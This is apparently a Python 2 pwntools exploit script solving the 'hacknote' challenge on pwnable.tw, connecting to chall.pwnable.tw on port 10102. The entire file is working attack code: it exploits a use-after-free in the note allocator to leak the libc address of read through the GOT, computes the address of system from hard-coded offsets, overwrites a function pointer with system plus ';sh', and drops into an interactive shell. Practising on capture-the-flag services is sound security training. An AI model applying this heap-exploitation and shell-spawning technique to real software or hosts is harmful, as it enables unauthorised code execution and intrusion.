# -*- coding: utf-8 -*-
#!/usr/bin/env python2
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

LOCAL = False

env = {'LD_PRELOAD':'./libc_32.so.6'}

show_func_addr = 0x0804862B
read_got_plt = 0x0804A00C


#remote
libc_read   = 0x000d41c0
libc_system = 0x0003a940
offset = libc_read - libc_system
'''
#local
libc_read   = 0x000dd280
libc_system = 0x00040310
offset = libc_read - libc_system
'''

if LOCAL:
    p = process('./hacknote')#,env=env)
else:
    p = remote('chall.pwnable.tw',10102)

def add_note(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(str(content))

def delete_note(index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))

def print_note(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def main():
    '''
    gdb.attach(p,"""
        b *0x08048646
	b *0x080488A5
	b *0x080487D4
	c
    """)
    '''
    add_note(32,'a' * 32) #0
    add_note(32,'b' * 32) #1
    delete_note(0)
    delete_note(1)
    #leak addr && get system addr
    payload = p32(show_func_addr) + p32(read_got_plt) #func + read_got_plt
    add_note(8,payload)
    #leak here
    print_note(0)
    read_addr = u32(p.recv(4).ljust(4,'\x00'))
    system_addr = read_addr - offset
    log.info("read addr:{0}".format(hex(read_addr)))
    log.info("system addr:{0}".format(hex(system_addr)))

    #modify puts_got to system_addr
    add_note(32,'c' * 32)
    delete_note(1)
    delete_note(2)
    payload = p32(system_addr) + ";"+"sh"+"\x00"
    add_note(8,payload)
    print_note(0)

    p.interactive()

if __name__ == '__main__':
    main()
